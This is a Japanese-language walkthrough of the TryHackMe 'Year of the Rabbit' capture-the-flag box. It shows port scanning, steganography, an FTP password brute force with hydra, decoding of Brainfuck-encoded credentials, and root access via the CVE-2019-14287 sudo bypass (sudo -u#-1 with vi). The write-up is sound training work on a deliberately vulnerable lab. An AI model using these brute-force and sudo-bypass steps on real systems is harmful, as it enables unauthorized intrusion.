# Year of the Rabbit CTF

https://tryhackme.com/r/room/yearoftherabbit

Let's have a nice gentle start to the New Year!
Can you hack into the Year of the Rabbit box without falling down a hole?

(Please ensure your volume is turned up!)

音量を上げておくようにという指示。どういうこと？

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.68.93
root@ip-10-10-11-163:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-01-04 00:39 GMT
Nmap scan report for 10.10.68.93
Host is up (0.0060s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:C9:D9:13:FE:4B (Unknown)

root@ip-10-10-11-163:~# sudo nmap -sV -p21,22,80 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-01-04 00:39 GMT
Nmap scan report for 10.10.68.93
Host is up (0.00015s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
MAC Address: 02:C9:D9:13:FE:4B (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

FTP, SSH, HTTP

HTTPはApacheのインストールページ  
FTPはAnonymousでは入れなかった

### gobuster

```shell
root@ip-10-10-11-163:~# gobuster dir -x php,txt,html -u http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.68.93
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 276]
/index.html           (Status: 200) [Size: 7853]
/.html                (Status: 403) [Size: 276]
/assets               (Status: 301) [Size: 311] [--> http://10.10.68.93/assets/]
/.html                (Status: 403) [Size: 276]
/.php                 (Status: 403) [Size: 276]
/server-status        (Status: 403) [Size: 276]
Progress: 882228 / 882232 (100.00%)
===============================================================
Finished
===============================================================
```

## mp4 ファイル

/assets の中に mp4 ファイルがあった。  
384MB。でかい・・・

```shell
$ wget http://10.10.68.93/assets/RickRolled.mp4
```

動画を見たら You are looking in a wrong place と言っていた。  
動画部分が無駄なのか、内部のファイルも含めてファイル全体が無駄なのか意図が分からない。

### ステガノ

binwalkでgzが出てきたが、gzを展開できていない。

```shell
$ binwalk -Me ./RickRolled.mp4

$ ls -al
total 169320
drwxrwxr-x 2 kali kali      4096 Jan  3 19:53 .
drwxrwxr-x 3 kali kali      4096 Jan  3 19:53 ..
-rw-rw-r-- 1 kali kali         0 Jan  3 19:53 DA4CE58
-rw-rw-r-- 1 kali kali 173375050 Jan  3 19:53 DA4CE58.gz

$ file ./DA4CE58.gz 
./DA4CE58.gz: gzip compressed data, has CRC, original size modulo 2^32 808464686 gzip compressed data, reserved method, from FAT filesystem (MS-DOS, OS/2, NT), original size modulo 2^32 808464686
```

展開できない。

```shell
$ gunzip ./DA4CE58.gz                               
gzip: ./DA4CE58.gz: header checksum 0x8472 != computed checksum 0x0146

$ 7z x ./DA4CE58.gz 

7-Zip 24.07 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-06-19
 64-bit locale=en_US.UTF-8 Threads:4 OPEN_MAX:1024

Scanning the drive for archives:
1 file, 173375050 bytes (166 MiB)

Extracting archive: ./DA4CE58.gz
--
Path = ./DA4CE58.gz
Type = gzip
Headers Size = 12

ERROR: Data Error : DA4CE58

Sub items Errors: 1

Archives with Errors: 1

Sub items Errors: 1
```

こういう文字があるので、ビデオが含まれていそうな感じはある

```shell
$ strings -n 11 ./DA4CE58.gz
（略）
VideoHandler
        E;s     F'C     F/
        K-Z     K3F     Mc
        y)L     {q{     {s
SoundHandler
        E7^     F#r     F-
        J+F     K)k     K/
Lavf57.83.100
```

### ヘッダー解析

https://www.ietf.org/rfc/rfc1952.txt

```text
1F 8B 08 02  FA 1B 32 F1   A2 3D 72 84  E8 02 6A 2C
CD 29 D7 41  0F 96 16 83   9C 2C 23 14  CA 8A FE 8F

+---+---+---+---+---+---+---+---+---+---+
|ID1|ID2|CM |FLG|     MTIME     |XFL|OS | (more-->)
+---+---+---+---+---+---+---+---+---+---+

(if FLG.FHCRC set)

    +---+---+
    | CRC16 |
    +---+---+

    +=======================+
    |...compressed blocks...| (more-->)
    +=======================+

    0   1   2   3   4   5   6   7
    +---+---+---+---+---+---+---+---+
    |     CRC32     |     ISIZE     |
    +---+---+---+---+---+---+---+---+

ID:    1F 8B -> gzip
CM:    08 -> deflate
FLG:   02 -> FHCRC
MTIME: FA 1B 32 F1 -> 4196086513 ->  2098年03月25日？
XFL:   A2 -> 0 or 2 or 4 なので不正？
OS:    3D -> 
CRC16: 0x8472
```

適当にヘッダーを変えてみてCRCの帳尻を合わせても展開できない。

```shell
$ gunzip ./DA4CE58.gz         

gzip: ./DA4CE58.gz: invalid compressed data--format violated
```

## style.css

/sup3r_s3cr3t_fl4g.php と書かれてた。

```css
  /* Nice to see someone checking the stylesheets.
     Take a look at the page: /sup3r_s3cr3t_fl4g.php
  */
```

/sup3r_s3cr3t_fl4g.php を開く。

```text
Word of advice... Turn off your javascript...
```

```http
HTTP/1.1 302 Found
Date: Sat, 04 Jan 2025 08:53:34 GMT
Server: Apache/2.4.10 (Debian)
Location: intermediary.php?hidden_directory=/WExYY2Cv-qU
Content-Length: 0
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
```

```http
HTTP/1.1 200 OK
Date: Sat, 04 Jan 2025 08:55:17 GMT
Server: Apache/2.4.10 (Debian)
Last-Modified: Thu, 23 Jan 2020 00:34:26 GMT
ETag: "263-59cc3cda20344-gzip"
Accept-Ranges: bytes
Vary: Accept-Encoding
Content-Length: 611
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html

<html>
	<head>
		<title>sup3r_s3cr3t_fl4g</title>
	</head>
	<body>
		<noscript>Love it when people block Javascript...<br></noscript>
		<noscript>This is happening whether you like it or not... The hint is in the video. If you're stuck here then you're just going to have to bite the bullet!<br>Make sure your audio is turned up!<br></noscript>
		<script>
			alert("Word of advice... Turn off your javascript...");
			window.location = "https://www.youtube.com/watch?v=dQw4w9WgXcQ?autoplay=1";
		</script>
		<video controls>
			<source src="/assets/RickRolled.mp4" type="video/mp4">
		</video>
	</body>
</html>

```

http://10.10.68.119/WExYY2Cv-qU/  を見たらHot_Babe.pngがあった。


```shell
$ wget http://10.10.68.119/WExYY2Cv-qU/Hot_Babe.png
```

Courseraの機械学習の講座で見たことある画像。

```shell
$ binwalk -Me ./Hot_Base.png

┌──(kali㉿kali)-[~/CTF/_Hot_Babe.png.extracted]
└─$ exiftool ./36        
ExifTool Version Number         : 12.76
File Name                       : 36
Directory                       : .
File Size                       : 787 kB
File Modification Date/Time     : 2025:01:04 04:45:21-05:00
File Access Date/Time           : 2025:01:04 04:45:21-05:00
File Inode Change Date/Time     : 2025:01:04 04:45:21-05:00
File Permissions                : -rw-rw-r--
Error                           : Unknown file type
```

謎のデータファイルが出てきた

```shell
$ exiftool ./Hot_Babe.png 
ExifTool Version Number         : 12.76
File Name                       : Hot_Babe.png
Directory                       : .
File Size                       : 475 kB
File Modification Date/Time     : 2020:01:22 19:34:32-05:00
File Access Date/Time           : 2025:01:04 04:41:54-05:00
File Inode Change Date/Time     : 2025:01:04 04:41:54-05:00
File Permissions                : -rw-rw-r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 512
Image Height                    : 512
Bit Depth                       : 8
Color Type                      : RGB
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
SRGB Rendering                  : Perceptual
Warning                         : [minor] Trailer data after PNG IEND chunk
Image Size                      : 512x512
Megapixels                      : 0.262
```

IENDチャンクの後にデータがあるらしい

```shell
$ strings ./Hot_Base.png
（略）
IEND
Ot9RrG7h2~24?
Eh, you've earned this. Username for FTP is ftpuser
One of these is the password:
Mou+56n%QK8sr
1618B0AUshw1M
A56IpIl%1s02u
vTFbDzX9&Nmu?
FfF~sfu^UQZmT
8FF?iKO27b~V0
ua4W~2-@y7dE$
3j39aMQQ7xFXT
Wb4--CTc4ww*-
u6oY9?nHv84D&
0iBp4W69Gr_Yf
TS*%miyPsGV54
C77O3FIy0c0sd
O14xEhgg0Hxz1
5dpv#Pr$wqH7F
1G8Ucoce1+gS5
0plnI%f0~Jw71
0kLoLzfhqq8u&
kS9pn5yiFGj6d
zeff4#!b5Ib_n
rNT4E4SHDGBkl
KKH5zy23+S0@B
3r6PHtM4NzJjE
gm0!!EC1A0I2?
HPHr!j00RaDEi
7N+J9BYSp4uaY
PYKt-ebvtmWoC
3TN%cD_E6zm*s
eo?@c!ly3&=0Z
nR8&FXz$ZPelN
eE4Mu53UkKHx#
86?004F9!o49d
SNGY0JjA5@0EE
trm64++JZ7R6E
3zJuGL~8KmiK^
CR-ItthsH%9du
yP9kft386bB8G
A-*eE3L@!4W5o
GoM^$82l&GA5D
1t$4$g$I+V_BH
0XxpTd90Vt8OL
j0CN?Z#8Bp69_
G#h~9@5E5QA5l
DRWNM7auXF7@j
Fw!if_=kk7Oqz
92d5r$uyw!vaE
c-AA7a2u!W2*?
zy8z3kBi#2e36
J5%2Hn+7I6QLt
gL$2fmgnq8vI*
Etb?i?Kj4R=QM
7CabD7kwY7=ri
4uaIRX~-cY6K4
kY1oxscv4EB2d
k32?3^x1ex7#o
ep4IPQ_=ku@V8
tQxFJ909rd1y2
5L6kpPR5E2Msn
65NX66Wv~oFP2
LRAQ@zcBphn!1
V4bt3*58Z32Xe
ki^t!+uqB?DyI
5iez1wGXKfPKQ
nJ90XzX&AnF5v
7EiMd5!r%=18c
wYyx6Eq-T^9#@
yT2o$2exo~UdW
ZuI-8!JyI6iRS
PTKM6RsLWZ1&^
3O$oC~%XUlRO@
KW3fjzWpUGHSW
nTzl5f=9eS&*W
WS9x0ZF=x1%8z
Sr4*E4NT5fOhS
hLR3xQV*gHYuC
4P3QgF5kflszS
NIZ2D%d58*v@R
0rJ7p%6Axm05K
94rU30Zx45z5c
Vi^Qf+u%0*q_S
1Fvdp&bNl3#&l
zLH%Ot0Bw&c%9
```

FTPのユーザー名は、ftpuser。  
パスワードリストでブルートフォースできそう。

```shell
$ hydra -l ftpuser -P ftppass.txt 10.10.68.119 ftp -t 30
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-04 04:55:25
[DATA] max 30 tasks per 1 server, overall 30 tasks, 82 login tries (l:1/p:82), ~3 tries per task
[DATA] attacking ftp://10.10.68.119:21/
[21][ftp] host: 10.10.68.119   login: ftpuser   password: 5iez1wGXKfPKQ
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-04 04:55:38
```

ヒット。  
ftpuser / 5iez1wGXKfPKQ でログインできた。

```shell
$ ftp 10.10.68.119   
Connected to 10.10.68.119.
220 (vsFTPd 3.0.2)
Name (10.10.68.119:kali): ftpuser
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

## FTP

```shell
ftp> ls
229 Entering Extended Passive Mode (|||27260|).
150 Here comes the directory listing.
-rw-r--r--    1 0        0             758 Jan 23  2020 Eli's_Creds.txt
226 Directory send OK.
ftp> get Eli's_Creds.txt
```

ファイル1つだけ。

```shell
$ cat ./Eli\'s_Creds.txt      
+++++ ++++[ ->+++ +++++ +<]>+ +++.< +++++ [->++ +++<] >++++ +.<++ +[->-
--<]> ----- .<+++ [->++ +<]>+ +++.< +++++ ++[-> ----- --<]> ----- --.<+
++++[ ->--- --<]> -.<++ +++++ +[->+ +++++ ++<]> +++++ .++++ +++.- --.<+
+++++ +++[- >---- ----- <]>-- ----- ----. ---.< +++++ +++[- >++++ ++++<
]>+++ +++.< ++++[ ->+++ +<]>+ .<+++ +[->+ +++<] >++.. ++++. ----- ---.+
++.<+ ++[-> ---<] >---- -.<++ ++++[ ->--- ---<] >---- --.<+ ++++[ ->---
--<]> -.<++ ++++[ ->+++ +++<] >.<++ +[->+ ++<]> +++++ +.<++ +++[- >++++
+<]>+ +++.< +++++ +[->- ----- <]>-- ----- -.<++ ++++[ ->+++ +++<] >+.<+
++++[ ->--- --<]> ---.< +++++ [->-- ---<] >---. <++++ ++++[ ->+++ +++++
<]>++ ++++. <++++ +++[- >---- ---<] >---- -.+++ +.<++ +++++ [->++ +++++
<]>+. <+++[ ->--- <]>-- ---.- ----. <
```

ぱっと見、モールス信号っぽい。

```text
+*[->+-*<]>+-*<
このパターンの繰り返し
```

```text
+++++ ++++[ ->+++ +++++ +<]>+ +++.<
+++++ [->++ +++<] >++++ +.<
++ +[->---<]> ----- .<
+++ [->++ +<]>+ +++.<
+++++ ++[-> ----- --<]> ----- --.<
+++++[ ->--- --<]> -.<
++ +++++ +[->+ +++++ ++<]> +++++ .++++ +++.- --.<
++++++ +++[- >---- ----- <]>-- ----- ----. ---.<
+++++ +++[- >++++ ++++<]>+++ +++.<
++++[ ->+++ +<]>+ .<
+++ +[->+ +++<] >++.. ++++. ----- ---.+++.<
+ ++[-> ---<] >---- -.<
++ ++++[ ->--- ---<] >---- --.<
+ ++++[ ->-----<]> -.<
++ ++++[ ->+++ +++<] >.<
++ +[->+ ++<]> +++++ +.<
++ +++[- >+++++<]>+ +++.<
+++++ +[->- ----- <]>-- ----- -.<
++ ++++[ ->+++ +++<] >+.<
+++++[ ->--- --<]> ---.<
+++++ [->-- ---<] >---. <
++++ ++++[ ->+++ +++++<]>++ ++++. <
++++ +++[- >---- ---<] >---- -.+++ +.<
++ +++++ [->++ +++++<]>+. <
+++[ ->--- <]>-- ---.- ----. <
```

整理

```text
+++++++++, +++++++++, ++++
+++++, +++++, +++++
+++, ---, -----
+++, +++, ++++
+++++++, -------, -------
+++++, -----, -
++++++++, ++++++++, +++++.+++++++.---
+++++++++, ---------, -----------.---
++++++++, ++++++++, ++++++
++++, ++++, +
++++, ++++, ++..++++.--------.+++
+++, ---, -----
++++++, ------, ------
+++++, -----, -
++++++, ++++++, 
+++, +++, ++++++
+++++, +++++, ++++
++++++, ------, --------
++++++, ++++++, +
+++++, -----, ---
+++++, -----, ---
++++++++, ++++++++, ++++++
+++++++, -------, -----.++++
+++++++, +++++++, +
+++, ---, -----.-----
```

- 1列目はすべて＋
- 1列目と2列の桁数は常に同じ
- 3桁目は0～2個のピリオドが含まれる

どうやら、BrainFuckというプログラミング言語らしい。  

Webで実行。  
https://kachikachi.net/brainfuck/

```text
User: eli Password: DSpDiM1wAEwid
```

## SSH

```shell
$ ssh eli@10.10.68.119
eli@10.10.68.119's password: 

1 new message
Message from Root to Gwendoline:

"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"

END MESSAGE

eli@year-of-the-rabbit:~$ ls -al /home/gwendoline
total 24
drwxr-xr-x 2 gwendoline gwendoline 4096 Jan 23  2020 .
drwxr-xr-x 4 root       root       4096 Jan 23  2020 ..
lrwxrwxrwx 1 root       root          9 Jan 23  2020 .bash_history -> /dev/null
-rw-r--r-- 1 gwendoline gwendoline  220 Jan 23  2020 .bash_logout
-rw-r--r-- 1 gwendoline gwendoline 3515 Jan 23  2020 .bashrc
-rw-r--r-- 1 gwendoline gwendoline  675 Jan 23  2020 .profile
-r--r----- 1 gwendoline gwendoline   46 Jan 23  2020 user.txt
```

user.txt はgwendolineにしか読めない。

ログイン時メッセージ。
```text
"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"
```

```shell
eli@year-of-the-rabbit:~$ find / -perm -o=r -type f -ls 2>/dev/null  | grep s3cr3t
 36976    4 -rw-r--r--   1 eli      eli            78 Jan 23  2020 /var/www/html/sup3r_s3cr3t_fl4g.php
 36980    4 -rw-r--r--   1 root     root          138 Jan 23  2020 /usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!

 eli@year-of-the-rabbit:~$ cat /usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
Your password is awful, Gwendoline. 
It should be at least 60 characters long! Not just MniVCQVhQHUNI
Honestly!

Yours sincerely
   -Root
```

gwendoline / MniVCQVhQHUNI

```shell
└─$ ssh gwendoline@10.10.68.119
gwendoline@10.10.68.119's password: 
Permission denied, please try again.
gwendoline@10.10.68.119's password: 


1 new message
Message from Root to Gwendoline:

"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"

END MESSAGE

gwendoline@year-of-the-rabbit:~$ 
```

入れた。

```shell
gwendoline@year-of-the-rabbit:~$ ls -al
total 24
drwxr-xr-x 2 gwendoline gwendoline 4096 Jan 23  2020 .
drwxr-xr-x 4 root       root       4096 Jan 23  2020 ..
lrwxrwxrwx 1 root       root          9 Jan 23  2020 .bash_history -> /dev/null
-rw-r--r-- 1 gwendoline gwendoline  220 Jan 23  2020 .bash_logout
-rw-r--r-- 1 gwendoline gwendoline 3515 Jan 23  2020 .bashrc
-rw-r--r-- 1 gwendoline gwendoline  675 Jan 23  2020 .profile
-r--r----- 1 gwendoline gwendoline   46 Jan 23  2020 user.txt
gwendoline@year-of-the-rabbit:~$ cat ./user.txt
THM{}
```

## 権限昇格

```shell
gwendoline@year-of-the-rabbit:~$ sudo -l
Matching Defaults entries for gwendoline on year-of-the-rabbit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gwendoline may run the following commands on year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
```

viをroot以外のユーザーで実行できる。

```shell
gwendoline@year-of-the-rabbit:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
messagebus:x:104:111::/var/run/dbus:/bin/false
avahi:x:105:112:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
uuidd:x:106:114::/run/uuidd:/bin/false
Debian-exim:x:107:115::/var/spool/exim4:/bin/false
statd:x:108:65534::/var/lib/nfs:/bin/false
avahi-autoipd:x:109:118:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
colord:x:110:120:colord colour management daemon,,,:/var/lib/colord:/bin/false
dnsmasq:x:111:65534:dnsmasq,,,:/var/lib/misc:/bin/false
geoclue:x:112:122::/var/lib/geoclue:/bin/false
pulse:x:113:123:PulseAudio daemon,,,:/var/run/pulse:/bin/false
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/sh
sshd:x:115:65534::/var/run/sshd:/usr/sbin/nologin
rtkit:x:116:125:RealtimeKit,,,:/proc:/bin/false
saned:x:117:126::/var/lib/saned:/bin/false
usbmux:x:118:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
hplip:x:119:7:HPLIP system user,,,:/var/run/hplip:/bin/false
Debian-gdm:x:120:127:Gnome Display Manager:/var/lib/gdm3:/bin/false
eli:x:1000:1000:eli,,,:/home/eli:/bin/bash
gwendoline:x:1001:1001:,,,:/home/gwendoline:/bin/bash
ftpuser:x:1002:1002:,,,:/var/ftp/uploads/:/bin/fakeshell
ftp:x:121:128:ftp daemon,,,:/srv/ftp:/bin/false
```

```shell
gwendoline@year-of-the-rabbit:~$ find / -perm -u=s -type f -ls 2>/dev/null
    87   40 -rwsr-xr-x   1 root     root        40000 Mar 29  2015 /bin/mount
   149   28 -rwsr-xr-x   1 root     root        27416 Mar 29  2015 /bin/umount
   131   40 -rwsr-xr-x   1 root     root        40168 Nov 20  2014 /bin/su
    46   32 -rwsr-xr-x   1 root     root        30800 Nov  8  2014 /bin/fusermount
    98  144 -rwsr-xr-x   1 root     root       146160 Oct  5  2014 /bin/ntfs-3g
133261   12 -rwsr-xr-x   1 root     root        10568 Feb 13  2015 /usr/bin/vmware-user-suid-wrapper
131712   12 -rwsr-sr-x   1 root     root        10104 Apr  1  2014 /usr/bin/X
132856   88 -rwsr-sr-x   1 root     mail        89248 Feb 11  2015 /usr/bin/procmail
132696   24 -rwsr-xr-x   1 root     root        23168 Nov 28  2014 /usr/bin/pkexec
132178   76 -rwsr-xr-x   1 root     root        75376 Nov 20  2014 /usr/bin/gpasswd
132504   40 -rwsr-xr-x   1 root     root        39912 Nov 20  2014 /usr/bin/newgrp
133111  148 -rwsr-xr-x   1 root     root       149568 Mar 12  2015 /usr/bin/sudo
131854   44 -rwsr-xr-x   1 root     root        44464 Nov 20  2014 /usr/bin/chsh
131852   56 -rwsr-xr-x   1 root     root        53616 Nov 20  2014 /usr/bin/chfn
131767   56 -rwsr-sr-x   1 daemon   daemon      55424 Sep 30  2014 /usr/bin/at
144604 3052 -rwsr-xr-x   1 root     root      3124160 Feb 17  2015 /usr/sbin/exim4
144679  328 -rwsr-xr--   1 root     dip        333560 Apr 14  2015 /usr/sbin/pppd
140362   16 -rwsr-xr-x   1 root     root        14632 Nov 28  2014 /usr/lib/policykit-1/polkit-agent-helper-1
135249  288 -rwsr-xr--   1 root     messagebus   294512 Feb  9  2015 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
264472   16 -rwsr-xr-x   1 root     root        14200 Oct 15  2014 /usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
140334  456 -rwsr-xr-x   1 root     root       464904 Mar 22  2015 /usr/lib/openssh/ssh-keysign
140383   12 -rwsr-xr-x   1 root     root        10248 Apr 15  2015 /usr/lib/pt_chown
135268   12 -rwsr-xr-x   1 root     root        10104 Feb 24  2014 /usr/lib/eject/dmcrypt-get-device
```

daemon として vi を起動し、at コマンドを実行でrootになれるか？

```shell
sudo -u daemon /usr/bin/vi /home/gwendoline/user.txt
:!/bin/sh

$ whoami
daemon
$ echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null
You do not have permission to use at.
```

daemonはatコマンドを使えないのでダメだった。
```shell
$ cat /etc/at.deny
alias
backup
bin
daemon
ftp
games
gnats
guest
irc
lp
mail
man
nobody
operator
proxy
qmaild
qmaill
qmailp
qmailq
qmailr
qmails
sync
sys
www-data
```

・・・というか、よく考えたらatの所有者はdaemonなので、SUIDがついていてもrootになれるわけではなかった。

## CVE-2019-14287

sudo のユーザーフィルタを回避できる脆弱性

```shell
gwendoline@year-of-the-rabbit:~$ sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt

:!/usr/bin
```

```shell
# whoami
root
# ls -al /root
total 20
drwx------  2 root root 4096 Jan 23  2020 .
drwxr-xr-x 23 root root 4096 Jan 23  2020 ..
lrwxrwxrwx  1 root root    9 Jan 23  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
-rw-r--r--  1 root root  140 Nov 19  2007 .profile
-rw-r-----  1 root root   46 Jan 23  2020 root.txt
# cat /root/root.txt
THM{}
```

## 振り返り
- mp4から出てきた謎gzデータや、謎のcoreファイル解析で長時間無駄にした。本当こういうの嫌い。
- sudo -u#-1 は、Courseraのハッキング系の講座で習ったことあったがすっかり忘れていた。
